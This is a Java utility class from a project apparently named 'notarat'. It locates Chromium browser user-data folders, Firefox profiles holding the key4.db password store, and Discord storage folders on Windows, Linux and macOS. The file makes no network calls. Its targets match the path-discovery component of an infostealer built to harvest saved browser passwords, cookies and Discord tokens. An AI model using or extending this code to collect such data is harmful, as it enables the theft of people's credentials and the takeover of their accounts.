package dev.xotic.notarat.util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.ArrayList;
import java.util.List;

public final class PathUtil {
// this class is vibecoded im so fucking sorry
    public enum OS { WINDOWS, LINUX, MAC }

    public static final OS currentOS;
    public static final String HOME = System.getProperty("user.home");

    static {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("win")) currentOS = OS.WINDOWS;
        else if (os.contains("mac")) currentOS = OS.MAC;
        else currentOS = OS.LINUX;
    }

    public static File home(String... parts) {
        File f = new File(HOME);
        for (String p : parts) f = new File(f, p);
        return f;
    }

    public static List<File> chromiumUserDataDirs() {
        List<File> dirs = new ArrayList<>();
        switch (currentOS) {
            case WINDOWS: {
                File local   = new File(System.getenv("LOCALAPPDATA"));
                File roaming = new File(System.getenv("APPDATA"));
                dirs.add(new File(local,   "Google\\Chrome\\User Data"));
                dirs.add(new File(local,   "Microsoft\\Edge\\User Data"));
                dirs.add(new File(local,   "BraveSoftware\\Brave-Browser\\User Data"));
                dirs.add(new File(local,   "Chromium\\User Data"));
                dirs.add(new File(local,   "Vivaldi\\User Data"));
                dirs.add(new File(roaming, "Opera Software\\Opera Stable"));
                dirs.add(new File(roaming, "Opera Software\\Opera GX Stable"));
                break;
            }
            case LINUX: {
                dirs.add(home(".config", "google-chrome"));
                dirs.add(home(".config", "chromium"));
                dirs.add(home(".config", "microsoft-edge"));
                dirs.add(home(".config", "BraveSoftware", "Brave-Browser"));
                dirs.add(home(".config", "vivaldi"));
                dirs.add(home(".config", "opera"));
                break;
            }
            case MAC: {
                dirs.add(home("Library", "Application Support", "Google", "Chrome"));
                dirs.add(home("Library", "Application Support", "Chromium"));
                dirs.add(home("Library", "Application Support", "Microsoft Edge"));
                dirs.add(home("Library", "Application Support", "BraveSoftware", "Brave-Browser"));
                dirs.add(home("Library", "Application Support", "Vivaldi"));
                dirs.add(home("Library", "Application Support", "com.operasoftware.Opera"));
                break;
            }
        }
        dirs.removeIf(f -> !f.isDirectory());
        return dirs;
    }

    public static List<File> firefoxProfileDirs() {
        List<File> roots = new ArrayList<>();
        switch (currentOS) {
            case WINDOWS:
                roots.add(new File(System.getenv("APPDATA"), "Mozilla\\Firefox"));
                break;
            case LINUX:
                roots.add(home(".mozilla", "firefox"));
                roots.add(home("snap", "firefox", "common", ".mozilla", "firefox"));
                break;
            case MAC:
                roots.add(home("Library", "Application Support", "Firefox"));
                break;
        }

        List<File> profiles = new ArrayList<>();
        for (File root : roots) {
            if (!root.isDirectory()) continue;

            File ini = new File(root, "profiles.ini");
            if (ini.isFile()) {
                String path = null;
                boolean relative = true;
                try (BufferedReader br = new BufferedReader(new FileReader(ini))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        line = line.trim();
                        if (line.startsWith("[")) {
                            if (path != null) flush(root, path, relative, profiles);
                            path = null; relative = true;
                        } else if (line.startsWith("Path=")) {
                            path = line.substring(5);
                        } else if (line.startsWith("IsRelative=")) {
                            relative = line.endsWith("1");
                        }
                    }
                    if (path != null) flush(root, path, relative, profiles);
                } catch (Exception ignored) {}
            }

            File[] kids = root.listFiles();
            if (kids != null) {
                for (File kid : kids) {
                    if (kid.isDirectory()
                            && new File(kid, "key4.db").isFile()
                            && !profiles.contains(kid)) {
                        profiles.add(kid);
                    }
                }
            }
        }
        return profiles;
    }
    public static List<File> discordStorageDirs() {
        List<File> dirs = new ArrayList<>();
        switch (currentOS) {
            case WINDOWS: {
                File appData = new File(System.getenv("APPDATA"));
                dirs.add(new File(appData, "discord"));
                dirs.add(new File(appData, "discordcanary"));
                dirs.add(new File(appData, "discordptb"));
                dirs.add(new File(appData, "discorddevelopment"));
                break;
            }
            case LINUX: {
                dirs.add(home(".config", "discord"));
                dirs.add(home(".config", "discordcanary"));
                dirs.add(home(".config", "discordptb"));
                dirs.add(home(".config", "discorddevelopment"));
                dirs.add(home(".var", "app", "com.discordapp.Discord",
                        "config", "discord"));                     // flatpak
                dirs.add(home("snap", "discord", "current", ".config",
                        "discord"));                               // snap
                break;
            }
            case MAC: {
                File app = home("Library", "Application Support");
                dirs.add(new File(app, "discord"));
                dirs.add(new File(app, "discordcanary"));
                dirs.add(new File(app, "discordptb"));
                dirs.add(new File(app, "discorddevelopment"));
                break;
            }
        }
        dirs.removeIf(f -> !f.isDirectory());
        return dirs;
    }
    private static void flush(File root, String path, boolean relative, List<File> out) {
        File pf = relative ? new File(root, path) : new File(path);
        if (pf.isDirectory() && new File(pf, "key4.db").isFile() && !out.contains(pf)) {
            out.add(pf);
        }
    }

    private PathUtil() {}
}